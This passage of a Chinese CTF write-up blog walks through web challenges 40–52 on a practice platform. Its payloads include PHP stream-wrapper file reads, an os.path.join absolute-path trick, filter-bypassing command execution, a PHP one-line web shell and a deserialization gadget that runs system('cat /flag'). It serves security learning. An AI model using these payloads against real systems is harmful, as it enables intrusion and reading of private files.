<p>1.<code>index</code>：当用户访问根 URL (<code>/</code>) 时，返回 ‘index.html’ 文件。这通常是网站的主页。</p>
<p>2.<code>source</code>：当用户访问 <code>/src</code> 路径时，返回 ‘app.py’ 文件。</p>
<p>3.<code>flag</code>：定义了一个 PUT 请求的路由 <code>/super-secret-route-nobody-will-guess</code>。这个路由返回 ‘flag’ 文件的内容。</p>
<p>那我们抓包修改请求方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231908926.png" alt="image-20240123190827822"></p>
<p>发送到Repeater，把GET方法修改成PUT，并且内容为/super-secret-route-nobody-will-guess</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231909621.png" alt="image-20240123190903564"></p>
<p>发送</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401231909520.png" alt="image-20240123190925445"></p>
<p>得到flag</p>

        <h1 id="四十、-GDOUCTF-2023-泄露的伪装"   >
          <a href="#四十、-GDOUCTF-2023-泄露的伪装" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十、-GDOUCTF-2023-泄露的伪装" class="headerlink" title="四十、[GDOUCTF 2023]泄露的伪装"></a>四十、[GDOUCTF 2023]泄露的伪装</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261615869.png" alt="image-20240126161520779"></p>
<p>查看网页源代码啥也没有，使用dirsearch扫描一下</p>
<p>输入命令</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\dirsearch.py -u http://node5.anna.nssctf.cn:28437/</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261603852.png" alt="image-20240126160315726"></p>
<p>访问/test.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261602947.png" alt="image-20240126160202829"></p>
<p>使用GET方法传入<code>cxk</code>，如果 <code>cxk</code> 参数存在，代码将尝试读取 <code>cxk</code> 参数指定的文件内容。如果该文件的内容为字符串 “ctrl”，则显示 <code>$flag</code> 变量的内容</p>
<p>访问/<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.rar,下载后有一个txt文件/" >www.rar，下载后有一个txt文件</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261604941.png" alt="image-20240126160456863"></p>
<p>那再访问一下/orzorz.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261606570.png" alt="image-20240126160629484"></p>
<p>算是一个有回显的并且中文正常的，但代码和/test.txt一样</p>
<p>使用php伪协议（Y3RybA==为ctrl字符的base64编码格式）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cxk=data://text/plain;base64,Y3RybA==</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261613312.png" alt="image-20240126161339235"></p>
<p>得到flag</p>

        <h1 id="四十一、-HNCTF-2022-Week1-Interesting-include"   >
          <a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十一、-HNCTF-2022-Week1-Interesting-include" class="headerlink" title="四十一、[HNCTF 2022 Week1]Interesting_include"></a>四十一、[HNCTF 2022 Week1]Interesting_include</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261632343.png" alt="image-20240126163200256"></p>
<p>使用GET方法传入参数filter，提示说flag在flag.php文件内</p>
<p>使用php伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?filter=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261631056.png" alt="image-20240126163120975"></p>
<p>使用CyberChef解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261633350.png" alt="image-20240126163332272"></p>
<p>得到flag</p>

        <h1 id="四十二、-NISACTF-2022-babyupload"   >
          <a href="#四十二、-NISACTF-2022-babyupload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十二、-NISACTF-2022-babyupload" class="headerlink" title="四十二、[NISACTF 2022]babyupload"></a>四十二、[NISACTF 2022]babyupload</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261636508.png" alt="image-20240126163628436"></p>
<p>文件上传题，上传一个图片马test.jpg</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261644751.png" alt="image-20240126164441680"></p>
<p>结果显示不对</p>
<p>看看网页源代码，发现有/source提示，访问一下</p>
<p>下载了压缩包，里面有文件app.py</p>
<p>重点内容:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line"></span><br><span class="line">def upload():</span><br><span class="line"></span><br><span class="line">  if &#x27;file&#x27; not in request.files:</span><br><span class="line"></span><br><span class="line">​    return redirect(&#x27;/&#x27;)</span><br><span class="line"></span><br><span class="line">  file = request.files[&#x27;file&#x27;]</span><br><span class="line"></span><br><span class="line">  if &quot;.&quot; in file.filename:</span><br><span class="line"></span><br><span class="line">​    return &quot;Bad filename!&quot;, 403</span><br><span class="line"></span><br><span class="line">  conn = db()</span><br><span class="line"></span><br><span class="line">  cur = conn.cursor()</span><br><span class="line"></span><br><span class="line">  uid = uuid.uuid4().hex</span><br><span class="line"></span><br><span class="line">  try:</span><br><span class="line"></span><br><span class="line">​    cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,))</span><br><span class="line"></span><br><span class="line">  except sqlite3.IntegrityError:</span><br><span class="line"></span><br><span class="line">​    return &quot;Duplicate file&quot;</span><br><span class="line"></span><br><span class="line">  conn.commit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  file.save(&#x27;uploads/&#x27; + file.filename)</span><br><span class="line"></span><br><span class="line">  return redirect(&#x27;/file/&#x27; + uid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/file/&lt;id&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">def file(id):</span><br><span class="line"></span><br><span class="line">  conn = db()</span><br><span class="line"></span><br><span class="line">  cur = conn.cursor()</span><br><span class="line"></span><br><span class="line">  cur.execute(&quot;select path from files where id=?&quot;, (id,))</span><br><span class="line"></span><br><span class="line">  res = cur.fetchone()</span><br><span class="line"></span><br><span class="line">  if res is None:</span><br><span class="line"></span><br><span class="line">​    return &quot;File not found&quot;, 404</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  \# print(res[0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f:</span><br><span class="line"></span><br><span class="line">​    return f.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">  app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></div></figure>

<p>意思就是文件名中不能有后缀，使用 <code>uuid4</code> 生成唯一文件ID，将文件信息插入数据库，保存文件到 ‘uploads’ 目录</p>
<p><code>os.path.join(&quot;uploads/&quot;, res[0])</code> 这个函数将 “uploads/“ 和 <code>res[0]</code>（从数据库中检索到的文件名）合并成一个完整的文件路径。<code>os.path.join</code> 用于构造路径，这样可以适应不同操作系统的路径规则</p>

        <h6 id="绝对路径拼接漏洞"   >
          <a href="#绝对路径拼接漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#绝对路径拼接漏洞" class="headerlink" title="绝对路径拼接漏洞"></a><em><strong>绝对路径拼接漏洞</strong></em></h6>
      
        <h6 id="os-path-join-path-paths-函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。"   >
          <a href="#os-path-join-path-paths-函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。" class="heading-link"><i class="fas fa-link"></i></a><a href="#os-path-join-path-paths-函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。" class="headerlink" title="*os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。"></a>*os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。</h6>
      
        <h6 id="然而，这个函数有一个少有人知的特性，如果拼接的某个路径以-开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径"   >
          <a href="#然而，这个函数有一个少有人知的特性，如果拼接的某个路径以-开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径" class="heading-link"><i class="fas fa-link"></i></a><a href="#然而，这个函数有一个少有人知的特性，如果拼接的某个路径以-开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径" class="headerlink" title="然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径"></a>然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</h6>
      <p>我们想要访问的是flag文件，因此，当上传的文件名为 /flag ，上传后通过uuid访问文件后，查询到的文件名是 /flag ，那么进行路径拼接时，uploads/ 将被删除，读取到的就是根目录下的 flag 文件。</p>
<p>所以上传一个图片马，抓包后，修改文件名为/flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261725871.png" alt="image-20240126172523762"></p>
<p>发送后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261725300.png" alt="image-20240126172542233"></p>
<p>有一个链接，关闭burpsuite拦截后访问/file/b08aa4f07f594f9fb9f4c60889a206a</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401261726517.png" alt="image-20240126172632448"></p>
<p>得到flag</p>

        <h1 id="四十三、-UUCTF-2022-新生赛-ez-rce"   >
          <a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十三、-UUCTF-2022-新生赛-ez-rce" class="headerlink" title="四十三、[UUCTF 2022 新生赛]ez_rce"></a>四十三、[UUCTF 2022 新生赛]ez_rce</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291616500.png" alt="image-20240129161604390"></p>
<p>过滤了很多关键字，而且可以看出是无回显类型的，于是可以想到用转义字符，并用<code>var_dump()</code>函数输出</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=var_dump(l\s /);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291314442.png" alt="image-20240129131459366"></p>
<p>不太行，后来得知php中对于输出函数，要给命令加上反引号，才表示执行里面的命令，不加就只是输出字符串（可编代码尝试）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401301138296.png"></p>
<p>加上反引号后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401301138703.png" alt="image-20240130113847636"></p>
<p>所以输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=var_dump(`l\s%20/`);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291306199.png" alt="image-20240129130626055"></p>
<p>欧，有了，现在打开fffffffffflagafag文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=var_dump(`c\at%20/ffffffffffl\agafag`);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401291614614.png" alt="image-20240129161452515"></p>
<p>得到flag</p>

        <h6 id="RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0"   >
          <a href="#RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE各种绕过总结：https-zhuanlan-zhihu-com-p-391439312-utm-id-0" class="headerlink" title="RCE各种绕过总结：https://zhuanlan.zhihu.com/p/391439312?utm_id=0"></a>RCE各种绕过总结：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/391439312?utm_id=0" >https://zhuanlan.zhihu.com/p/391439312?utm_id=0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h6>
      
        <h1 id="四十四、-SWPUCTF-2022-新生赛-Ez-upload"   >
          <a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十四、-SWPUCTF-2022-新生赛-Ez-upload" class="headerlink" title="四十四、[SWPUCTF 2022 新生赛]Ez_upload"></a>四十四、[SWPUCTF 2022 新生赛]Ez_upload</h1>
      <p>同[GXYCTF2019]BabyUpload 1</p>
<p>不过最后的flag在蚁剑里没找到，文件上传后访问</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upload/7d0551daade57740c3ca7319cc7065e4/test.jpg?shell=phpinfo();</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401311451545.png" alt="image-20240131145123394"></p>
<p>得到flag</p>

        <h1 id="四十五、-HNCTF-2022-Week1-easy-html"   >
          <a href="#四十五、-HNCTF-2022-Week1-easy-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十五、-HNCTF-2022-Week1-easy-html" class="headerlink" title="四十五、[HNCTF 2022 Week1]easy_html"></a>四十五、[HNCTF 2022 Week1]easy_html</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443662.png" alt="image-20240201144308620"></p>
<p>饼干，英文为cookie，抓包看看cookie的值</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011443690.png" alt="image-20240201144347649"></p>
<p>访问一下这个/f14g.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011444568.png" alt="image-20240201144410527"></p>
<p>随便输入11个数字试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011444960.png" alt="image-20240201144447919"></p>
<p>不对，而且只能输入10个字符，查看网页源代码发现是限制了字符的长度，按F12修改为11位试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011446766.png" alt="image-20240201144629715"></p>
<p>再重新输入十一个数字，点击登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402011442912.png" alt="image-20240201144247804"></p>
<p>获得flag</p>

        <h1 id="四十六、-羊城杯-2020-easycon"   >
          <a href="#四十六、-羊城杯-2020-easycon" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十六、-羊城杯-2020-easycon" class="headerlink" title="四十六、[羊城杯 2020]easycon"></a>四十六、[羊城杯 2020]easycon</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330390.png" alt="image-20240202133033288"></p>
<p>奇奇怪怪，访问一下/index.php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021332931.png" alt="image-20240202133202886"></p>
<p>意思就是使用POST方法传入参数cmd</p>
<p>先直接传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls /&quot;);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021333592.png" alt="image-20240202133343499"></p>
<p>没什么可疑的，再看看当前目录的文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls&quot;);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021353025.png" alt="image-20240202135344980"></p>
<p>gw.jpg和gw2.jpg都是网页的图片，bbbbbbbbb.txt有点可疑</p>
<p>打开/bbbbbbbbb.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021327077.png" alt="image-20240202132735859"></p>
<p>看到最后是一个“＝”符号，猜测是base64编码，拿到CyberChef解密</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021328284.png" alt="image-20240202132843214"></p>
<p>有一个”JFIF”，表明这是一个图像文件的base64编码</p>
<p>那么将它的解密输出成一个jpg格式的文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021330448.png" alt="image-20240202133002278"></p>
<p>得到flag</p>

        <h1 id="四十七、-GDOUCTF-2023-受不了一点"   >
          <a href="#四十七、-GDOUCTF-2023-受不了一点" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十七、-GDOUCTF-2023-受不了一点" class="headerlink" title="四十七、[GDOUCTF 2023]受不了一点"></a>四十七、[GDOUCTF 2023]受不了一点</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021447505.png" alt="image-20240202144743440"></p>
<p>阅读代码</p>
<p>①用POST方法传入“ctf”和”gdou“变量，并且这两个变量的md5值相同，没有过滤函数，因此可以用数组绕过</p>
<p>②设置Cookie的值为cookie=j0k3r</p>
<p>③使用GET方法传入”aaa”和”bbb”变量，并且这两个变量都要为114514（弱比较），但又不能完全相同，因此给一个变量的值后面随便加一个字母即可</p>
<p>④若同时使用GET方法和POST方法传入”flag”变量，则返回’cancanwordflag’，若只用一种方法传入且值为‘flag’时，则返回’hacker!’。</p>
<p><em>使用两个<code>foreach</code>循环遍历<code>$_POST</code>和<code>$_GET</code>数组，$$key用于创建与数组键名相同的变量，变量值为数组的值。</em></p>
<p><em><code>$key</code>和<code>$value</code>分别代表数组元素的键和值。每次循环，<code>$key</code>和<code>$value</code>会被分别赋值为当前数组元素的键和值。最后，代码输出<code>$flag</code>的值。但是前面并没有设定flag结合foreach循环和前面判断语句的含义，这里是要传参一个flag=flag才回回显最终的flag信息，但是这里有对flag的传参进行了限制，但是也只对flag的传参进行了限制</em></p>
<p><em>也就是说，对于其他变量的传参并没有做任何限制，那么我们可以先将另一个变量的参数设置为flag，再赋值给flag变量作为flag变量的参数</em></p>
<p>所以最终为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021457716.png" alt="image-20240202145746656"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402021458001.png" alt="image-20240202145800970"></p>
<p>得到flag</p>

        <h1 id="四十八、-SWPUCTF-2022-新生赛-奇妙的MD5"   >
          <a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十八、-SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="四十八、[SWPUCTF 2022 新生赛]奇妙的MD5"></a>四十八、[SWPUCTF 2022 新生赛]奇妙的MD5</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041134435.png" alt="image-20240204113428318"></p>
<p>查看网页源代码没啥线索，抓包看看</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041136204.png" alt="image-20240204113616165"></p>
<p>又是这个语句，输入ffifdyop</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041139232.png" alt="image-20240204113942174"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041140043.png" alt="image-20240204114004010"></p>
<p>用GET方法传入x和y，值不能相同但是md5值要相同，可以用数组绕过</p>
<p>构造payload:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c0nt1nue.php?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041137531.png" alt="image-20240204113758493"></p>
<p>阅读代码是要我们用POST方法传入wqh和dsy变量，两个值不能相等但是md5值要相同，没有过滤函数可以用数组绕过</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041135746.png" alt="image-20240204113549703"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041137910.png" alt="image-20240204113740874"></p>
<p>得到flag</p>

        <h1 id="四十九、-HNCTF-2022-Week1-easy-upload"   >
          <a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="heading-link"><i class="fas fa-link"></i></a><a href="#四十九、-HNCTF-2022-Week1-easy-upload" class="headerlink" title="四十九、[HNCTF 2022 Week1]easy_upload"></a>四十九、[HNCTF 2022 Week1]easy_upload</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041152938.png" alt="image-20240204115202903"></p>
<p>没有要求哪种类型的文件，直接上传写有一句话木马的.php文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041149550.png" alt="image-20240204114917510"></p>
<p>直接上传成功，用蚁剑连接试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041150706.png" alt="image-20240204115050649"></p>
<p>能成功，添加数据后查看根目录找到ffflllaaaggg文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402041151201.png" alt="image-20240204115144168"></p>
<p>得到flag</p>

        <h1 id="五十、-SWPUCTF-2022-新生赛-1z-unserialize"   >
          <a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十、-SWPUCTF-2022-新生赛-1z-unserialize" class="headerlink" title="五十、[SWPUCTF 2022 新生赛]1z_unserialize"></a>五十、[SWPUCTF 2022 新生赛]1z_unserialize</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103390.png" alt="image-20240205110348342"></p>
<p><em>destruct 方法在对象销毁时会自动调用，而且其中的代码会在函数调用时执行。unserialize($_POST[‘nss’]);执行完成后，这个通过 unserialize 重新创建的对象没有被任何变量引用，因此它将会被标记为不再需要，并最终会被 PHP 垃圾回收机制销毁。在对象被销毁的时候，destruct 方法会被自动调用。</em></p>
<p>题中给的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a = $this-&gt;lt;</span><br><span class="line">$a($this-&gt;lly);</span><br></pre></td></tr></table></div></figure>

<p>相当于</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;lt($this-&gt;lly);//很像命令执行 函数+指令</span><br></pre></td></tr></table></div></figure>

<p><em>所以我们可以通过构造一个恶意的序列化对象，将自定义的函数传递给 $lt 属性，然后将要执行的代码（或者指向一个恶意代码文件的路径）传递给 $lly 属性。当对象被序列化后再被反序列化时，__destruct 方法会被自动调用，从而执行指定的恶意操作。</em></p>
<p><em>只要传参把$lt变成system();this-&gt;lly变成ls或者cat就是一个简单的命令注入了</em></p>
<p>先查看根目录</p>
<p>查看序列化</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class lyh&#123;</span><br><span class="line"></span><br><span class="line">  public $url = &#x27;NSSCTF.com&#x27;;</span><br><span class="line"></span><br><span class="line">  public $lt = &#x27;system&#x27;;</span><br><span class="line"></span><br><span class="line">  public $lly = &#x27;ls /&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   function  __destruct()</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line"></span><br><span class="line">​    $a = $this-&gt;lt;</span><br><span class="line"></span><br><span class="line">​    $a($this-&gt;lly);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = new lyh();</span><br><span class="line"></span><br><span class="line">echo serialize($d);</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></div></figure>

<p>返回O:3:”lyh”:3:{s:3:”url”;s:10:”NSSCTF.com”;s:2:”lt”;s:6:”system”;s:3:”lly”;s:4:”ls /“;}</p>
<p>利用HackBar用POST方法给nss传参</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051109018.png" alt="image-20240205110916980"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051109275.png" alt="image-20240205110900235"></p>
<p>打开/flag文件，构造最终payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=O:3:&quot;lyh&quot;:3:&#123;s:3:&quot;url&quot;;s:10:&quot;NSSCTF.com&quot;;s:2:&quot;lt&quot;;s:6:&quot;system&quot;;s:3:&quot;lly&quot;;s:9:&quot;cat /flag&quot;;&#125; </span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051103322.png" alt="image-20240205110323212"></p>
<p>得到flag</p>

        <h1 id="五十一、-HNCTF-2022-Week1-What-is-Web"   >
          <a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十一、-HNCTF-2022-Week1-What-is-Web" class="headerlink" title="五十一、[HNCTF 2022 Week1]What is Web"></a>五十一、[HNCTF 2022 Week1]What is Web</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124520.png" alt="image-20240205112419458"></p>
<p>页面上没找到有用的信息，看看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051124874.png" alt="image-20240205112454804"></p>
<p>解码一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402051125497.png" alt="image-20240205112515454"></p>
<p>得到flag</p>

        <h1 id="五十二、-HNCTF-2022-Week1-Interesting-http"   >
          <a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十二、-HNCTF-2022-Week1-Interesting-http" class="headerlink" title="五十二、[HNCTF 2022 Week1]Interesting_http"></a>五十二、[HNCTF 2022 Week1]Interesting_http</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071151506.png" alt="image-20240207115118460"></p>
<p>用POST方法传入参数want，那肯定是想要flag，所以传入</p>
